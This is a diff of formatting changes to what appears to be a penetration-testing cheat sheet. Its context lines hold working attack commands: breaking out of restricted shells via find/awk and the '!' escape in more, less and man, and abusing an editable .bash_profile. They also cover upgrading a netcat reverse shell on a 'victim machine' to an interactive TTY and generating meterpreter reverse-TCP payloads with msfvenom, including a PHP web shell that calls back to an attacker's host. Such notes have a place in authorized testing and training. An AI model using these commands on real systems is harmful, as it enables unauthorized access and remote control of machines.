@@ -50,15 +50,12 @@ find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
 
 -----
  After you use the 'more', 'less', or 'man' command with a file, type '!' followed by a command. For instance, try the following once inside the file. // more, less, man commands
------
 
 echo "evil script code" | tee script.sh      // tee -a to append at the end of the file
 
  == Files Executed in Unrestricted Mode? ==
 
------ 
- Some restricted shells will start by running some files in an unrestricted mode before the restricted shell is applied. If your .bash_profile is executed in an unrestricted mode and it's editable, you'll be able to execute code and commands as an unrestricted user.
------
+Some restricted shells will start by running some files in an unrestricted mode before the restricted shell is applied. If your .bash_profile is executed in an unrestricted mode and it's editable, you'll be able to execute code and commands as an unrestricted user.
 
 **OTHERS**
 
@@ -77,11 +74,11 @@ john@Kioptrix4:/var/www$ ls -la /usr/lib/lib_mysqludf_sys.so
 
 
 **== Upgrading half shells to fully interactive TTYs without closing nc session. ==**
- -----
+
 python -c 'import pty; pty.spawn("/bin/bash")'
- -----
+
 background remote shell with Ctrl+Z    // on victim machine
- -----
+
 stty -a | grep rows    //on attacking machine
 speed 38400 baud; rows 55; columns 205; line = 0;
 echo $TERM     // on attacking machine
@@ -93,8 +90,8 @@ export SHELL=BASH          //on victim machine
 stty rows 55 columns 205   //on victim machine. See stty -a
 
 **SHELLS:**
- -----
- MSFVENOM
+
+MSFVENOM
     
  List payloads
  msfvenom -l
@@ -117,7 +114,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your 
  
            == Web payloads ==
   
-  PHP
+PHP
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 
